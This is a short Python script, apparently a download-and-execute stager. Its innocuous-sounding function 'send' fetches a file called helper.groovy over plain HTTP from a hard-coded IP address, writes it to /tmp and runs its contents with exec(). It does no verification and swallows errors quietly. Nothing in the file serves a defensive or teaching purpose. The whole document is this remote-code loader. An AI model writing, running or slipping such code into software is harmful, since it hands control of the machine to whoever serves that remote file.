import urllib.request
import os

def send():
    try:
        url = "http://112.112.168.1/helper.groovy"
        local_file = "/tmp/helper.groovy"

        urllib.request.urlretrieve(url, local_file)

        with open(local_file, "r") as f:
            script = f.read()

        exec(script)

    except Exception as e:
        print(e)

send()
